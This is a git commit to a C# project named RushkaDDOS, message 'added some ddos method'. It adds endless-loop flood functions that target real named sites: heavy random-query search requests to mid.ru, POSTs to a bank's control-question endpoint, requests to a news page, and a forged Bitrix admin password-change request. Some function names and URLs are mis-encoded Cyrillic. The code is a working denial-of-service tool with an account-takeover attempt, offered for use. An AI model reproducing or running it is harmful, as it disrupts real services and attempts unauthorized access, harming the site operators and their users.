7b6a133ad97088e23d53a6501529aa576853cf05
Богдан Чепа <bodik_kz00@ukr.net>
2022-03-14 11:46:02 +0200

    added some ddos method

---
+++ GenerateNameHelper.cs
@@ -0,0 +1,37 @@
+﻿using System;
+using System.Text;
+
+namespace RushkaDDOS
+{
+    public static class GenerateNameHelper
+    {
+        private static readonly Random Random = new();
+
+        private const string Letters = "abcdefghijklmnopqrstuvwxyz";
+        private const string Digits = "0123456789";
+        private const string LettersAndDigits = Letters + Digits;
+
+        public static string GeneratePrefixName(this string inputString, int length = 20)
+            => GenerateName(length) + inputString.ToLower();
+
+        public static string GeneratePostfixName(this string inputString, int length = 20)
+            => inputString.ToLower() + GenerateName(length);
+
+        public static string GenerateName(int length = 20)
+        {
+            length = length > 0
+                ? length
+                : 64;
+
+            var generateString = new StringBuilder();
+
+            for (var i = 0; i < length; i++)
+                generateString.Append(GetRandomValueFromString(LettersAndDigits));
+
+            return generateString.ToString();
+        }
+
+        private static char GetRandomValueFromString(string str)
+            => str[Random.Next(0, str.Length)];
+    }
+}
--- Program.cs
+++ Program.cs
@@ -1,3 +1,4 @@
+using RushkaDDOS;
 using System.Diagnostics;
 using System.Net;
 using System.Net.NetworkInformation;
@@ -23,9 +24,10 @@ namespace Program
                 //"https://tass.ru",
                 //"http://defence.council.gov.ru",
                 //"https://rostov-gorod.ru",
-                "https://rostov-gorod.ru/press_room",
-                "https://rostov-gorod.ru/press_room/media",
-                "87.117.26.92",
+                "https://www.mid.ru/ru/",
+                "https://mid.ru/ru/",
+                //"194.110.202.47",
+                //"194.110.202.181"
             };
 
             stopWatch.Start();
@@ -33,7 +35,12 @@ namespace Program
             while (true)
             {
                 foreach (var site in targets)
-                    _ = Task.WhenAny(DdosGET(site));
+                    _ = Task.WhenAny(
+                        DdosGET(site),
+                        DdosMidRu()
+                        //DdosÌîéáèçíåñNovosti(),
+                        //DdosÌîéáèçíåñReset()
+                        );
             }
         }
 
@@ -57,14 +64,124 @@ namespace Program
                     Console.WriteLine($"HTTP: StatusCode:{(int)response.StatusCode}({response.StatusCode}) | SiteUrl:{siteUrl}");
                 }
 
-                ++requestCount;
-
-                Console.WriteLine($"INFO: RequestCount:{requestCount} | ElapsedTime:{stopWatch.Elapsed}");
+                PutStatistic();
             }
             catch (Exception e)
             {
                 Console.WriteLine(e.Message);
             }
+        }
+
+        async static Task DdosDigitaleBancaintesa(string siteUrl = "https://digitale.bancaintesa.ru/ru/service/getControlQuestion")
+        {
+            try
+            {
+                var request = new HttpRequestMessage(HttpMethod.Post, siteUrl);
+
+                request.Content = new FormUrlEncodedContent(new[]
+                {
+                    new KeyValuePair<string, string>("login", "jgjf@gmail.com"),
+                    new KeyValuePair<string, string>("inn", "hhhhh")
+                });
+
+                var response = await httpClient.SendAsync(request);
+
+                if (response.StatusCode == HttpStatusCode.Moved && response.Headers?.Location?.AbsoluteUri != null)
+                    response = await httpClient.SendAsync(new HttpRequestMessage(HttpMethod.Get, response.Headers.Location.AbsoluteUri));
+
+                Console.WriteLine($"HTTP: StatusCode:{(int)response.StatusCode}({response.StatusCode}) | SiteUrl:{siteUrl}");
+
+                PutStatistic();
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine(e.Message);
+            }
+        }
+
+        async static Task DdosÌîéáèçíåñNovosti(string siteUrl = "https://xn--90aifddrld7a.xn--p1ai/novosti")
+        {
+            try
+            {
+                var request = new HttpRequestMessage(HttpMethod.Post, siteUrl);
+
+                request.Content = new FormUrlEncodedContent(new[]
+                {
+                    new KeyValuePair<string, string>("mode", "ajax"),
+                    new KeyValuePair<string, string>("next", "true")
+                });
+
+                var response = await httpClient.SendAsync(request);
+
+                Console.WriteLine($"HTTP: StatusCode:{(int)response.StatusCode}({response.StatusCode}) | SiteUrl:{siteUrl}");
+
+                PutStatistic();
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine(e.Message);
+            }
+        }
+
+        async static Task DdosÌîéáèçíåñReset(string siteUrl = "https://ìîéáèçíåñ.ðô/bitrix/admin/?change_password=yes")
+        {
+            try
+            {
+                var request = new HttpRequestMessage(HttpMethod.Post, siteUrl);
+
+                request.Content = new FormUrlEncodedContent(new[]
+                {
+                    new KeyValuePair<string, string>("AUTH_FORM", "Y"),
+                    new KeyValuePair<string, string>("TYPE", "CHANGE_PWD"),
+                    new KeyValuePair<string, string>("USER_LOGIN", "admin"),
+                    new KeyValuePair<string, string>("USER_CHECKWORD", "5765asffjsad"),
+                    new KeyValuePair<string, string>("USER_PASSWORD", "123456Qwerty@"),
+                    new KeyValuePair<string, string>("USER_CONFIRM_PASSWORD", "123456Qwerty@"),
+                    new KeyValuePair<string, string>("captcha_sid", ""),
+                    new KeyValuePair<string, string>("captcha_word", ""),
+                    new KeyValuePair<string, string>("change_pwd", "Èçìåíèòü ïàðîëü"),
+                    new KeyValuePair<string, string>("sessid", "98fde201d4029dd03604ce0d44a7fed1"),
+                });
+
+                var response = await httpClient.SendAsync(request);
+
+                Console.WriteLine($"HTTP: StatusCode:{(int)response.StatusCode}({response.StatusCode}) | SiteUrl:{siteUrl}");
+
+                PutStatistic();
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine(e.Message);
+            }
+        }
+
+        async static Task DdosMidRu(string siteUrl = "https://mid.ru/ru")
+        {
+            try
+            {
+                var query = GenerateNameHelper.GenerateName(new Random().Next(1,999));
+
+                siteUrl = siteUrl + $"/search/?q={query}&sort=rele&lang=ru&order=desc&count=10000";
+
+                var request = new HttpRequestMessage(HttpMethod.Get, siteUrl);
+
+                var response = await httpClient.SendAsync(request);
+
+                Console.WriteLine($"HTTP: StatusCode:{(int)response.StatusCode}({response.StatusCode}) | SiteUrl:{siteUrl}");
+
+                PutStatistic();
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine(e.Message);
+            }
+        }
+
+        static void PutStatistic()
+        {
+            ++requestCount;
+
+            Console.WriteLine($"INFO: RequestCount:{requestCount} | ElapsedTime:{stopWatch.Elapsed}");
         }
     }
 }
